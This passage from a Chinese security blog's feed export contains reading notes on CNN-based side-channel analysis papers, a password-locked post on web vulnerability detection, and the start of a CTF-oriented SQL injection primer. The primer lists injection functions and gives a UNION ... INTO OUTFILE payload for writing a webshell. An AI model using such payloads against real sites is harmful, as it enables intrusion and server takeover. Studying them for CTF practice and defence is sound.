mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>就是第一个全连接层的权重，<strong>注意： 这里是Zaid论文中展示的计算展平层权重的公式，由于展平层并不涉及训练的权重，本文作者改为对[flatten + 1]也就是全连接层作可视化， 公式如下：</strong></p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>v</mi><mi>i</mi><mi>s</mi></mrow></msup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><msubsup><mi>n</mi><mi>u</mi><mrow><mo stretchy="false">[</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mfrac><msubsup><mo>∑</mo><mrow><mi>m</mi><mo>=</mo><mn>0</mn></mrow><msubsup><mi>n</mi><mi>u</mi><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msubsup></msubsup><msubsup><mi>W</mi><mi>m</mi><mrow><mi>v</mi><mi>i</mi><mi>s</mi></mrow></msubsup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">W^{vis}[i] = \frac{1}{n_{u}^{[flatten + 1]}} \sum_{m=0}^{n_u^{flatten+1}}W_{m}^{vis}[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0747em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.8564em;vertical-align:-0.6625em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.4486em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0591em;"><span style="top:-2.377em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span></span></span></span><span style="top:-3.0591em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">tt</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1587em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6625em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1939em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.245em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.927em;"><span style="top:-2.214em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">u</span></span></span><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">tt</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-2.453em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></p>
<p>这里<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>n</mi><mi>u</mi><mrow><mo stretchy="false">[</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>t</mi><mi>e</mi><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">n_{u}^{[flatten +1]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1614em;vertical-align:-0.1166em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.5834em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">u</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">tt</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1166em;"><span></span></span></span></span></span></span></span></span></span>是展平层后的全连接层神经元数量</p>
<h4 id="基于扰动的前向传播">基于扰动的前向传播</h4>
<h4 id="基于反向传播">基于反向传播</h4>
<ul>
<li>Layer-wise Relevance Propagation (LRP)</li>
<li>Gradient * Input</li>
<li>Integrated Gradients 梯度积分</li>
<li>DeepLIFT</li>
</ul>
<h3 id="热图-Heatmaps">热图 Heatmaps</h3>
<h3 id="感受野">感受野</h3>
<h2 id="模型结构">模型结构</h2>
<p>相较于Zaid提出的在输入部分新增卷积核大小为一的卷积层（瓶颈层），作者认为如果采用恰当的数据预处理技术可以省略该层以减少模型的训练参数量，因此作者删除了第一个卷积层和其后边的批量归一化层，但保留池化层，对输入的数据进行降维处理，删除前后训练参数量对比如表1所示。</p>
<img src="../img/image-20230911144224340.png" alt="表1 不同结构模型参数量对比" style="zoom:67%;" />
<p>作者结合不同的数据预处理（标准化、缩放）后，用于训练ASCAD能量迹数据集，epoch=50，batchsize=50，lr=0.005，Zaid提出的模型（以下称Zmodel）与简化后的模型（以下称Smodel）猜测熵收敛曲线如图1、图2所示。</p>
<img src="../img/image-20230911144323232.png" alt="图1 Zaid与本文简化模型在不同数据预处理条件下针对对齐数据集的猜测熵收敛曲线对比" style="zoom:67%;" />
<p><img src="../img/image-20230911144512420.png" alt="图2	不对齐数据集上横向预处理后猜测熵收敛曲线对比"></p>
<p>作者为了研究批量归一化层对模型的影响，同时删除Zmodel中的批量归一化层，通过新增横向标准化的预处理作对比，在ASCAD N100数据集上 猜测熵收敛曲线如图3所示。</p>
<p><img src="../img/image-20230911150741108.png" alt="图3	删掉批量归一化后两模型收敛曲线对比"></p>
<p><strong>通过以上的实验数据可以得出，在经过横向标准化之后的Smodel与Zmodel在数据集上，在超参数保持一致的前提下，二者收敛曲线类似，模型效果相当</strong></p>
<h2 id="权重可视化方案">权重可视化方案</h2>
<p>在Zaid等人的研究中，通过第一个全连接层来反映输入数据的权重，本文作者采用梯度*输入来定位兴趣点，在DPAv4数据集上结果如图4所示。可以看到随着过滤器大小的增加，Zaid等人提出的方案会展示出更模糊的兴趣点（权重值大的点变多），而采用梯度*输入方法，则更能精确地反映POI的位置（这里还没有去证实，只是论文里这样说的，但看起来兴趣点似乎确实被更精确地标记了）。如图4、8所示，</p>
<img src="../img/image-20230911151202103.png" alt="图4	针对不同滤波器大小 权重可视化（上）以及梯度可视化（下）的兴趣点可视化" style="zoom:67%;" />
<img src="../img/image-20230911154938032.png" alt="图8	利用梯度输入可视化在AES_RD未对齐数据集上的展示的兴趣点位置" style="zoom:67%;" />
<p>为了证实Zaid的观点（由上可知，Z等人认为过滤器越大会导致模型效果更差）是错误的，作者在DPAv4数据集上针对不同大小为1、100的过滤器做消融实验，收敛曲线如图5所示，可以看到随着过滤器大小的增加，模型收敛效果也越好。</p>
<p><img src="../img/image-20230911152558112.png" alt="图5	DPAv4数据集 不同卷积核大小下模型猜测熵曲线对比"></p>
<h2 id="感受野与过滤器大小">感受野与过滤器大小</h2>
<img src="../img/image-20230911153742813.png" alt="图6	两层CNN感受野表示" style="zoom:67%;" />
<p>更大的过滤器必然会导致更大的感受野，进而生成稳健性更好的模型，但过大的感受野也会导致巨量的训练参数，因此作者在这里选择不同的过滤器大小来对ASCAD、AES_RD攻击，猜测熵曲线 如图7所示，可以看到增大过滤器的大小会致使收敛效果更好。</p>
<img src="../img/image-20230911154243483.png" alt="图7	ASCAD N50、N100数据集上 不同过滤器大小对猜测熵曲线的影响" style="zoom:67%;" />
<h2 id="确定卷积块个数">确定卷积块个数</h2>
<p>作者为了反驳Zaid的观点（卷积块数量越多模型性能越差），在ASCAD数据集上做消融实验，通过增加卷积块个数对比模型收敛速度，如图9所示，可以看出实验中增加卷积块个数并不会对模型造成负面影响，</p>
<img src="../img/image-20230911201032219.png" alt="图9	针对ASCAD desynch50、100 AES_RD等数据集采用不同数量卷积块时猜测熵曲线对比" style="zoom:67%;" />
<h1>总结</h1>
<p>作者在Zaid工作的基础上提出部分相反的观点并证实Zaid等人的错误。</p>
<ol>
<li>在Zaid等人提出的模型基础上进行简化，去掉第一个卷积层、归一化层，保留池化层。</li>
<li>在训练开始前对数据进行横向标准化处理。</li>
<li>找到权重可视化技术 梯度*输入来证明Zaid等人的工作是错误的，但也指出利用这种技术并不能直接证明模型的好坏。</li>
<li>反驳Zaid等人的纠缠观点，这里纠缠是指模型越深效果越差。</li>
<li>找到简化模型的合适超参数。</li>
</ol>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>模型结构</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-On the Performance of Convolutional Neural Networks for Side-channel Analysis</title>
    <url>/archives/b68bb5eb.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Stjepan Picek, Ioannis Petros Samiotis, Annelie Heuser, Jaehun Kim, Shivam Bhasin, and Axel Legay</strong></p>
</li>
<li>
<p>单位：<strong>代尔夫特理工大学</strong></p>
</li>
<li>
<p>出处：<strong>[International Conference on Security, Privacy, and Applied Cryptography Engineering](<a href="https://link.springer.com/conference/space">https://link.springer.com/conference/space</a> space)  SPACE 2018</strong></p>
</li>
<li>
<p>标题：<strong>On the Performance of Convolutional Neural Networks for Side-channel Analysis</strong></p>
</li>
</ul>
<p><strong>写在前面</strong></p>
<p>文章主要是做了实验来验证不同数据集上Naive Bayes、XGBoost、RF、MLP、CNN等代表性模型性能，给了实验数据，没源码。</p>
<h1>文章内容</h1>
<h2 id="模型">模型</h2>
<blockquote>
<p>模型的网格搜索字典</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MLP：&#123;<span class="string">&quot;activation&quot;</span>:<span class="string">&quot;ReLU, Tanh&quot;</span>, </span><br><span class="line">		 <span class="string">&quot;hidden layers num&quot;</span>:[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],</span><br><span class="line">     <span class="string">&quot;Num of nerons per layers&quot;</span>: [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>],  <span class="comment">#each layer神经元个数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">XGBoost : &#123;</span><br><span class="line">  <span class="string">&quot;lr&quot;</span>: [<span class="number">0.001</span>, <span class="number">0.01</span>, <span class="number">0.1</span>, <span class="number">1</span>],</span><br><span class="line">  <span class="string">&quot;num of estimator&quot;</span> : [<span class="number">100</span>, <span class="number">200</span>, <span class="number">400</span>]</span><br><span class="line">&#125;,</span><br><span class="line">  </span><br><span class="line">RF : &#123;</span><br><span class="line">  <span class="string">&quot;trees&quot;</span> : [<span class="number">10</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">500</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>CNN</p>
</blockquote>
<img src="../img/image-20231130215312146.png" alt="CNN 模型网格调参" style="zoom:67%;" />
<p><img src="../img/image-20231130133732948.png" alt="本文CNN结构"></p>
<h2 id="结果">结果</h2>
<p>利用HW4挑选50个特征，在DPAv4数据集不同的模型攻击准确率。</p>
<img src="../img/image-20231130133859336.png" alt="DPAv4数据集攻击结果" style="zoom:80%;" />
<img src="../img/image-20231130215927553.png" alt="DPAv2 攻击结果" style="zoom:67%;" />
<img src="../img/image-20231130220017583.png" alt="DPAv2上 随机时延数据集攻击结果" style="zoom:67%;" />
<p><img src="../img/image-20231130220242051.png" alt="猜测熵收敛曲线"></p>
<h1>总结</h1>
<p>作者主要是针对不同的数据集、模型做了系统的实验，给出结论：</p>
<ol>
<li>仅增加能量迹条数或者特征数量不能保证性能有所提高，（特征数量只能连续添加， 不可能一直取信噪比最高的点否则在随机时延或时钟抖动数据集上模型效果会很差。</li>
<li>作者发现噪声与数据不平衡更影响CNN的性能。</li>
<li>作者发现CNN相较于其他机器学习模型训练开销更大，这个在超参搜索字典规模就可以看出来。</li>
<li>在不同的数据集上CNN模型的超参数需要重新训练，这样更会加剧训练开销。</li>
</ol>
]]></content>
      <tags>
        <tag>神经网络分析</tag>
      </tags>
  </entry>
  <entry>
    <title>华为杯-通用web漏洞检测与验证</title>
    <url>/archives/987b87c3.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="11715e4c47d05788d0d0b6d39e857935e2865e183e3b586719c106d732ff4375">ee733bf2dd71e66968255e3fc5c69a3c048225b1276a78af7c96d874f4f6fbb8e08cdb2cdf7e0fe240ed1c2761d4a80b7bf338f0cfbd020f5ee6f7234f7390791f9c16e003e8e4a750064eb7f40b021a99cfe827c4fe31471e772be34d0058cc909276c87ef05d266e6b9b145c20eb100655cdf28a5f41f3308178dbb7e058b0d1dd37f9bea6c0ffea3d0c815de0a660cf1022aa30dfc12a18fdd65e5428b4e37b1c9cd542168e9b40442925c1831a6da96a4490ebb1f63e169e9327b7061e0d956f4859f206cc7d51be67e7d870a83b38ecc1a07d9ffbf4b7764a4f4369ac5557143aa499d749680ff6a59cc07afbbdd4b64014e946aeb26e42c9f71942e20b5dfba59f2e42e10096c37b8f0123b2454679df650f0d31477afdb193e31e1affecbdd059be453a21b82423385408ae8bf4f8b0d19c17f376f087f264d6cc1f35a16596d0d6930399a3c55d3b6f5d2e5cf79b75e8926b7171b688984744051165368ffed72bc0c3e0d4527ead34e1a9a1c04128c06342b3cdb448fdc3cb028a6c750d63b1e44e8d20df7c1030831088a5ba8bfe7a610c0b8fefd525c94b6cecefa5d8d586f2a83a18428860833777c86f22cdf9a7094e6c5b0d36f622fafba47522f08dfaadcf081ae65e7e93942d264cb2a3369f4a4780815fc27896a7c27746a1f6814a266bde758de0fce614c7a797c92f5a40f1e5f72db09f11aaae7cb4a708217fab9cd895594600586f59d06b2900034eee3099b2e48dc50879c5845d6f013cb680f534840253b7ce6443ba7ac226cd7ce28296d863623ec93da57b7735ca594004e6a3143ed20a2b761a837b1c0a35eed9ebc2caf5db63ddf029935874dd61aabab199f123305f3c907dd54238868f59a63cc945005ac66036de2f05532a40e66a7151b2510f4fea901ff4717a669f47919525d9c63a23b94cabdb038ffa74fff7be8917e673b9d60b8aa3a8c50e6c500c48194cd6a3a35658c74ec6017d0c0432e96999bc4d70dc964242e701f9dd0fdee7e07524a3efb8db8c8fc6d60d75fa96abc0debeb6105a8b09ee63b41d250350be9fa50feb3a113d6812ecc551a5b7400a815839cc91307c76635d7ba4b2160fc9091c8c302abf4c4ebbf41ba73e5da9abf9da621dd2ffa32a87de5784043c80a98305d566ce3b366375610807d3bebec91d504c3116db34c8ae2727c7756540750704498b850364a64015cc5f80b3e98ef73b2b04a0a07358e652d59ab1921fe72f909b056bf345ed22c121a7f94f83da1f0250ad758ad78a6acff08ba02409eb5be21b74dc114c40f34b288b2c7cd540e3b778336fba08c5405cdd5a2b07b9654ef316a4a214206f0b5bf1c260555d0bdd55bc6e7872fc186edfd389539ca718fa033cfee589702cc02a6422f1101e659c96d481d97f41cfd1336e4cb0e4ed4a6c5a922acde461641e38729613c1818bfa6a1bff930d9f7c7437fd47ec50d46a8bd61ccbaa822ee8abab02a88a3db2acae4ba14998a0672e3d7eeccb85da2b11df9acb0b3bb62788590a233bd2d9cdb7f48607716022ef57487d36ae04468fae510c94224fa10a4163811049d79818b9c6f0d9562953cb2bd945060308c2408f240d7fe8fec7fbdba9592ebfa498f2702d9f8378f19a59e0f5362fb4bf61456ca4f0f450d751baa8cd8a3ef16f3d67f58162800e95a37a57f6620c3de154b0721ecce8755460ca305c878032e417640c6cd95dfad79bd1a90909e358e3386a30a97717a95c21e2c40e5709a158f5208d50db15b516809cce5013d014d0aaf64860825a6f53a7255114b628b01287588182531fdb49fa9b86eeecc94b02ca98e4284757ceb300fc9061e2acc9f65d9da3ba84f099d4a4f82561b4a0fa37732659759111272175de1854747b9f4e6547be5b4c1309208891dcb7297fff980dd887487e90e481deef6d854874f4fbf81a5379bc019d623695bb1b5134b59b15f76b72116be4305368e7bae2828e4589d2c1fa577dab6066546995f3040dac7ad574e148e8a3e5608e517f182594a06962db01ccbca9ced10278a5ff26d18b4e97dbcd3918a976745f9ee8eb3d06be3b0f9e25f67633682af8fa3427c706f652a572637e5ca89782ed6b318a4174e3bc7844922008af8461a5132571c925056cb1cb0e00639ba55f732e13f1abcd41ef4a07459c16845f37e92d8da42b8da04261e84e2a1fb518f086d905a48a59bad4c79e2b594733dbafc6786c63a886d922228d1e980ec60b4fe25e30661004e4d3df96e4ffb2ac3c9e430854d33978b8d146a0d497dc2e3373d4223b77be235bae88ee91e641158314941a91dd08a8ca2c1e4fe541e5ee858fcc4657c3b9c7b83fe43a9649ffd261b9a4517bdc642d5667a233653237fbf81d961e90afc7b020fc848e0717911cd6693e35f3f8efab50b25f0b92a635120a8924bb60e48d9aab7d457c8aa4cbde140cfbc1ed7e8fc796c77ea1420a3ba85720dd0e966daf2b9d81a85bc529375a65f96e24cdd10fa352d673993528e272505981c9c07d34f6f5e468676685a448ddb19daacbf186265ffa95a9a0455ab38e88d9598c22b7a2f2ec7833688ec1d874fbc1cfd900be56e83471c886d5163c75258e5bdaa4538214a32c01b8f23f32f8b4bdb3a445794ac721376e0f3caf1fb536e75f98f1f3051973960d3c2df101bcb5e12b44b970e57cb0747d9e11bc54004e25e92695cae8b167563e9b483b70bdc339cdc8e0fc3e01a04858fc13f8e440395ee714ad49419443a2b45f8e0b6ed59182e60fbeedf3b7db2fb945b5a694fc2da41d8cc3be9f51bceb163eaf10a5e5c9620070c6f4058115f521081ea842b50f07bda4049a5c1652cee7a31a8aa884403cda54fa7a3abde89a928436ee04374d768da8b4c5feab38709abd6d8cc8a00247f7e84425bc43a6d59136deb1181ee30a9db48065b40e89d03a5af909f7139f662ec99548b387d1dd44d10793a666adf41b2e0e8a5ff55224d6497f8f3a235494556258374ca47e6df1171054af26a62692b39d0a4056980a7bd5f4e6a0945454c82c3f8d37d1d29db9b50502eafe473a3a6cdd0d61d03ea9b032204650a0f45dafca1b697062c92241bdb883654f14e51308111e99036de99d5fcfb3251074cf93ba57959db5dce13619a556db38f4722db787457f385dd90522f4e53340a14110ab55499731dba9c594a94d2b50935c89d3a46cf26bc2d63e0e9e5f27732b7c9739e673f9f9292dc821846fa289a9bbbaf21fa38d1f240c76156c124586df92a1afa835dc947146d40d0e8943c48ec62e3dc30509b2369e8c60f5804bd7b05fb4a46d56f3ecf30f47bd1445312397d8ebe73c78a1c5259ec73bf278c6d2105be33a4af0373d7c58d505b00a34100158e107cbf86201b6df9ac3c8244d614fe35b22d0aa1deebf59948e1db1f8f79d1969679572896f02b7e2bd88cb949274315364aeba83bdf916b17ebd1e832c367aa29a4f2e9c0db8a19f1a64eac47e78823e39924bf1a9162040988774ca6600335c1376f8f73255b8b4b0e95af63e0cb33812150988109a7b5ae9448dc9ec3dddea2064b6a6b560d2c12bfcef5acdcb20d8515d2b7ab0879c4eb487acf3ee41d7a847ed0d2a35ef9443b3c20f247f80cc618d5a46496a0df73e9c7855b24eee3c2086b186235ef4a0bf1c5243c146ae553552f2b63c3eceaf8710a81ae1a2d1a5b6f3e23604e4425a01c01ec3eef65ff301be62b2d39ff713cec1fa3f49f332d8fc72b893ed281622ecc1c5d6a49daf71d6dc244c6b6b9f3d49f9dd8b8e9803d07831b4eed1a1c77f5521cf32e273796fdf3535a7c3b506edbb3a88e6e19e941f45c03d6d5223a6ab75c33d7a3d99506b74a1e5d543e85f257b9526aaafdf349ea55018ed2d91b91088c1242cb04179b9e36cb95e99862f8378d97daae410038b0796c5ca696eeda2ea5fe66a17e4f3409acdb04ec584e5f9cea86b48e68e5a3d0cfed010638c2399a190f1e375b9c4babbbb05c44599b47a4df123582f9edeebe3eadd2efe95bc24ad94749102b7f960b09442389122f31272e913e314ea8e2d74903ae0aa9d68b00a6d9439889fbb69fe71cd1b17cca4853ae669ed44f0a7929d46ce29d02879cee6858ee68234cd81b3ea04d1edfcbe665adf5e1e1b2d8b5e879453f2d05ee50e03b27055cd42188d526782d7856bf1f2d7746d4ab4c8f3fd4469dda5ec374cd76f56730db4dedf4cd67124ef0738e0e786d7baa55f979eab6f2ba67ba81dab17835bc84ed343ac7ca5b671a080402b4553f387a1b244fc4ff1366b1f</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-blink">
      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码,Pay for me !!!.">这里需要密码,Pay for me !!!.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Re-ctfshow-从零开始的SQL注入</title>
    <url>/archives/d87f7e0c.html</url>
    <content><![CDATA[<h1>八股文</h1>
<h2 id="原理">原理</h2>
<p>​		在开发过程中构造的方法、函数对输入数据过滤不严,从而造成预期之外的返回结果,此时攻击者利用此漏洞来拼接执行恶意SQL语句,从而达到攻击的目的。</p>
<h2 id="注入类型">注入类型</h2>
<p>​		参数类型划分: 字符型、数字型、搜索型注入</p>
<p>​		注入方法划分: 基于报错的注入、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内敛查询注入、宽字节注入</p>
<p>​		提交方式划分: GET注入、POST注入、COOKIE注入、HTTP头注入</p>
<h2 id="如何判断不同的数据库">如何判断不同的数据库</h2>
<ol>
<li>通过对主机端口进行扫描，判断端口开放的情况大概判断出类型</li>
</ol>
<blockquote>
<p>Oracle: 1521 	 SQL Server: 1433 	 MySQL: 3306  	PostgreSql: 	 5432</p>
</blockquote>
<ol start="2">
<li>通过注入不同函数来判断数据库类型</li>
</ol>
<table>
<thead>
<tr>
<th>数据库</th>
<th>特殊函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>mysql</td>
<td>@@version，version都可执行</td>
</tr>
<tr>
<td>mssql</td>
<td>substring可执行</td>
</tr>
<tr>
<td>oracle</td>
<td>substr</td>
</tr>
</tbody>
</table>
<ol start="3">
<li>根据注释符号来判断</li>
</ol>
<table>
<thead>
<tr>
<th>数据库</th>
<th>注释符</th>
</tr>
</thead>
<tbody>
<tr>
<td>mysql</td>
<td>#, --(后跟空格),  /* */</td>
</tr>
<tr>
<td>Access</td>
<td>null, %00</td>
</tr>
<tr>
<td>oracle</td>
<td>–(不跟空格), 不支持;子句查询</td>
</tr>
<tr>
<td>MSSQL</td>
<td>–(不跟空格)</td>
</tr>
</tbody>
</table>
<h2 id="mysql5-0以上以及5-0以下有什么区别">mysql5.0以上以及5.0以下有什么区别</h2>
<p>5.0以下没有information.schema库,只能暴力跑表</p>
<h2 id="Mysql-与-的区别">Mysql @ 与 @@的区别</h2>
<p>一个@是用户自定义变量</p>
<p>两个@是系统变量</p>
<h2 id="Mysql注入常用函数">Mysql注入常用函数</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">database() 返回当前数据库名</span><br><span class="line">user() 返回当前数据库用户名</span><br><span class="line">updatexml() 更新xml文档，常用于报错注入</span><br><span class="line">mid() 从指定字段中提取出字段的内容</span><br><span class="line">limit() 返回结果中的前几条数据或者中间的数据</span><br><span class="line">concat() 返回参数产生的字符串</span><br><span class="line">group_concat() 分组拼接函数</span><br><span class="line">count() 返回指定参数的数目</span><br><span class="line">rand() 参数0~1个随机数</span><br><span class="line">flood() 向下取整</span><br><span class="line">substr() 截取字符串</span><br><span class="line">ascii() 返回字符串的ascii码</span><br><span class="line">left() 返回字符串最左边指定个数的字符</span><br><span class="line">ord() 返回字符的ascii码</span><br><span class="line">length() 返回字符串长度</span><br><span class="line">sleep() 延时函数</span><br></pre></td></tr></table></figure>
<h2 id="sql注入写shell">sql注入写shell</h2>
<p><strong>条件</strong></p>
<p>当前数据库用户有dba权限, 需要有网站的绝对路径且有可写目录, mysql的<code>secure_file_priv</code>配置为空</p>
<p><strong>用法</strong>:</p>
<p>mysql:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,&#x27;shell&#x27; into outfile &quot;网站绝对路径\shell&quot; #</span><br></pre></td></tr></table></figure>
<p>sqlserver:</p>
